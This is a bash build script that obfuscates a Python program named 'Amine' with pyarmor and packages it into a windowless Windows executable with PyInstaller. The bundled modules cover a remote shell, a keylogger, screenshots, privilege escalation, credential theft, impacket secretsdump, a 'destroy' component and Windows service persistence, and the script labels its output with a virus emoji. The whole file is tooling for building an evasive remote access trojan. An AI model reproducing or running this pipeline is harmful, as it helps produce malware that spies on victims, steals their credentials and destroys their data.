#!/bin/bash

echo "Build starts..."
wine python -m pip install -r requirements.txt > /dev/null
echo "Requirements installed"

wine python build_scripts/obfuscate.py > /dev/null
echo "Obfuscation completed"

if ls | grep Amine.spec > /dev/null; then
    echo "Amine.spec found, building with pyinstaller"
    wine python -m PyInstaller Amine.spec > /dev/null
else
    echo "Amine.spec file not found, building with pyinstaller"
    wine python -m PyInstaller \
        --onefile \
        --noconsole \
        --paths=build/obf \
        --paths=build/obf/src \
        --paths=build/obf/pyarmor_runtime_000000 \
        --add-data "build/obf/pyarmor_runtime_000000;pyarmor_runtime_000000" \
        --collect-all json \
        --collect-all pyarmor_runtime_000000 \
        --hidden-import json \
        --hidden-import pyarmor_runtime_000000 \
        --hidden-import pyarmor_runtime_000000.pyarmor_runtime \
        --hidden-import client \
        --hidden-import client.main \
        --hidden-import client.config \
        --hidden-import client.utils \
        --hidden-import client.tools \
        --hidden-import client.tools.__init__ \
        --hidden-import client.tools.shell \
        --hidden-import client.tools.cmd \
        --hidden-import client.tools.screenshot \
        --hidden-import client.tools.keylogger \
        --hidden-import client.tools.privesc \
        --hidden-import client.tools.shell_handler_windows \
        --hidden-import client.tools.creds \
        --hidden-import client.tools.creds_navigator \
        --hidden-import client.tools.destroy \
        --hidden-import paramiko \
        --hidden-import win32serviceutil \
        --hidden-import win32service \
        --hidden-import win32event \
        --hidden-import win32api \
        --hidden-import win32con \
        --hidden-import win32timezone \
        --hidden-import servicemanager \
        --hidden-import pywintypes \
        --hidden-import ctypes \
        --hidden-import ctypes.wintypes \
        --hidden-import sqlite3 \
        --hidden-import base64 \
        --hidden-import shutil \
        --hidden-import tempfile \
        --hidden-import pathlib \
        --hidden-import cryptography \
        --hidden-import cryptography.hazmat \
        --hidden-import cryptography.hazmat.primitives \
        --hidden-import cryptography.hazmat.primitives.ciphers \
        --hidden-import cryptography.hazmat.primitives.ciphers.aead \
        --hidden-import winreg \
        --hidden-import mss \
        --hidden-import impacket \
        --hidden-import impacket.examples.secretsdump \
        --hidden-import impacket.winregistry \
        --hidden-import impacket.crypto \
        --hidden-import impacket.structure \
        --hidden-import impacket.ntlm \
        --hidden-import Cryptodome.Cipher.ARC4 \
        --hidden-import Cryptodome.Cipher.DES \
        --hidden-import Cryptodome.Cipher.AES \
        --hidden-import Cryptodome.Hash.MD4 \
        --hidden-import Cryptodome.Hash.MD5 \
        --hidden-import Cryptodome.Hash.HMAC \
        --hidden-import pyasn1 \
        --workpath=build/pyinstaller \
        --distpath=dist \
        build/obf/src/Amine.py > /dev/null
fi

echo "Build completed"

echo "🦠 : $(realpath dist/Amine.exe)"